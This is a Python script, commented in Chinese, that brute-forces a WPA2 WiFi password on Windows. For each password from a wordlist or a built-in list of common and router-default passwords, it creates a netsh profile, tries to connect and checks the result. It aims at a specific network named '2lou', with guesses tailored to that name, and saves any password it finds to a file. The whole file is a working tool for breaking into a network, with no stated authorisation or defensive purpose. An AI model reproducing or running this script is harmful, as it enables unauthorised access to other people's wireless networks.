#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFi 密码穷举连接脚本 — 通过不断尝试连接来破解密码
不需要管理员权限，不需要抓包

用法：
  python brute_connect.py <SSID> <字典文件>
  python brute_connect.py 2lou wordlist.txt
"""

import subprocess
import sys
import os
import time
import xml.etree.ElementTree as ET
import tempfile

TEMPLATE = """<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>
"""


def run(cmd):
    """执行命令并返回输出"""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30,
            encoding="utf-8", errors="ignore"
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "TIMEOUT"
    except Exception as e:
        return str(e)


def delete_profile(ssid):
    """删除 WiFi 配置文件"""
    run(f'netsh wlan delete profile name="{ssid}"')


def add_profile(ssid, password):
    """添加 WiFi 配置文件"""
    xml_content = TEMPLATE.format(ssid=ssid, password=password)

    # 写 XML 到临时文件
    tmpdir = tempfile.gettempdir()
    xml_path = os.path.join(tmpdir, f"wifi_{ssid}.xml")
    with open(xml_path, "w", encoding="utf-8") as f:
        f.write(xml_content)

    # 添加配置文件
    output = run(f'netsh wlan add profile filename="{xml_path}"')
    os.remove(xml_path)
    return output


def try_connect(ssid):
    """尝试连接 WiFi"""
    output = run(f'netsh wlan connect name="{ssid}"')
    return output


def check_connected(ssid):
    """检查是否已连接到指定 SSID"""
    output = run('netsh wlan show interfaces')
    for line in output.split("\n"):
        if "SSID" in line and ssid in line:
            # 确认状态
            if "已连接" in output or "connected" in output.lower():
                return True
    # 更精确的检查
    lines = output.split("\n")
    current_ssid = None
    for i, line in enumerate(lines):
        if "SSID" in line:
            parts = line.split(":")
            if len(parts) > 1:
                current_ssid = parts[1].strip()
    return current_ssid == ssid


def disconnect():
    """断开当前 WiFi 连接"""
    run('netsh wlan disconnect')


def main():
    ssid = sys.argv[1] if len(sys.argv) > 1 else "2lou"
    wordlist = sys.argv[2] if len(sys.argv) > 2 else None

    print(f"{'='*60}")
    print(f"  WiFi 密码穷举连接")
    print(f"  目标 SSID: {ssid}")
    print(f"{'='*60}\n")

    if wordlist and os.path.isfile(wordlist):
        print(f"[*] 使用字典: {wordlist}")
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(f"[*] 共 {len(passwords)} 个密码\n")
    else:
        # 常见密码列表
        print("[*] 使用内置常见密码列表")
        passwords = [
            # 常见弱密码
            "12345678", "88888888", "00000000", "11111111", "22222222",
            "66666666", "99999999", "123456789", "87654321",
            "password", "admin123", "admin888", "qwertyuiop",
            # 常见中国 WiFi 密码模式
            "8888888888", "1234567890", "0000000000",
            # 手机号格式(常见的虚拟号段)
            "13800138000", "13900139000",
            # 路由器默认密码
            "admin", "tplink", "123456789a",
            "11223344", "12341234", "abcd1234",
            "abc12345", "a1234567",
            # 常见组合
            "welcome1", "iloveyou",
            "000000", "111111", "222222", "333333",
            "555555", "777777", "121212", "131313",
            # 针对"2lou"的特殊猜测
            "2lou1234", "2lou8888", "2lou2024", "2lou2025",
            "lou12345", "erluo888",
            "88886666", "16888888", "66668888",
            # wifi 热点
            "wifi1234", "wifi8888",
        ]
        print(f"[*] 共 {len(passwords)} 个内置密码\n")

    # 先断开当前连接
    print("[*] 断开当前 WiFi...")
    disconnect()
    time.sleep(2)

    tried = 0
    for pwd in passwords:
        tried += 1
        pwd_clean = pwd.strip()
        if len(pwd_clean) < 8:
            continue  # WPA2 要求至少 8 位

        print(f"\r[{tried}/{len(passwords)}] 尝试: {pwd_clean:<20}", end="", flush=True)

        # 删除旧配置
        delete_profile(ssid)

        # 添加新配置
        result = add_profile(ssid, pwd_clean)
        if "拒绝访问" in result:
            print(f"\n[!] 权限不足，请以管理员身份运行")
            sys.exit(1)

        time.sleep(1)

        # 尝试连接
        try_connect(ssid)
        time.sleep(4)  # 等待连接

        # 检查是否连接成功
        if check_connected(ssid):
            print(f"\n\n{'='*60}")
            print(f"  🎉 密码已找到！")
            print(f"  SSID     : {ssid}")
            print(f"  Password : {pwd_clean}")
            print(f"{'='*60}\n")

            # 保存结果
            with open(f"{ssid}_password.txt", "w") as f:
                f.write(f"SSID: {ssid}\nPassword: {pwd_clean}\n")
            print(f"[*] 密码已保存到 {ssid}_password.txt")
            return pwd_clean

    print(f"\n\n[*] 已尝试 {tried} 个密码，未找到正确的")
    print("[*] 建议使用更大的字典文件：python brute_connect.py 2lou rockyou.txt")
    return None


if __name__ == "__main__":
    main()